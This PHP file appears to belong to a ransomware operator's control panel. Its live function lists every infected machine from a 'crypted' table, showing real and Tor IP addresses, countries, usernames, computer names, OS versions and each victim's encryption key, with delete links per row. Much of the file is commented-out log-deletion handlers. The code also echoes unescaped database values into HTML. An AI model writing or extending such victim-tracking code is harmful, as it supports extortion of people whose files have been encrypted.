<?php
// require '../../db.php';

// if (isset($_GET['func'])) {
//     switch (trim($_GET['func'])) {
//         case "getlogs":
//             crypterload();
//             break;
//         case "deletelog":
//             deletelog();
//             break;
//         case "deletelogs":
//             deletelogs();
//             break;
//         case "deleteall":
//             deletelogs();
//             break;
//     }
// }

// function deletelog($id)
// {
//     $log = R::load('crypted', $id);
//     R::trash($log);
//     //echo $result = "deleted";
// }

//////////////////////Delete logs

// function deletelogs()
// {
//     // foreach ($_POST['ids'] as $key => $id) {
//     //     $log = R::load('crypted', $id);
//     //     R::trash($log);
//     // }
//     //echo $result = json_encode($_POST['ids']);
// }

// function deletealllogs(){
//     //$log = R::load('crypted');
//     //R::trash($log);
// }

function crypterload(){


$rows_rules = R::findAll('crypted');
foreach ($rows_rules as $rule){
	echo ('<tr id='.$rule["id"].'>'.
        '<td>'.$rule["id"].'</td>'.
        '<td>'.$rule["machine_id"].'</td>'.
        '<td>'.$rule["real_ip"].'</td>'.
        '<td>'.$rule["real_country"].'</td>'.
        '<td>'.$rule["tor_ip"].'</td>'.
        '<td>'.$rule["tor_country"].'</td>'.
        '<td>'.$rule["username"].'</td>'.
        '<td>'.$rule["compname"].'</td>'.
        '<td>'.$rule["os_version"].'</td>'.
        '<td>'.$rule["enckey"].'</td>'.
        '<td>'.$rule["date_added"].'</td>'.
        '<td><a class="btn btn_deleteRules btn-sm btn-block btn-outline-info" href="crypted.php?func=delete&id='.$rule["id"].'">Delete</a></td>'. // </td>'.
        //'<td>'.
        //    '<div class="custom-control custom-checkbox">'.
        //        '<input type="checkbox" class="checkbox_isActive custom-control-input" id="customCheck'.$rule["id"].'" '.$check.' data-parsley-multiple="groups" data-parsley-mincheck="2">'.
        //        '<label class="custom-control-label" for="customCheck'.$rule["id"].'"></label>'.
        //    '</div>'.
        //'</td>'.
        '</tr>');
    }
}


?>

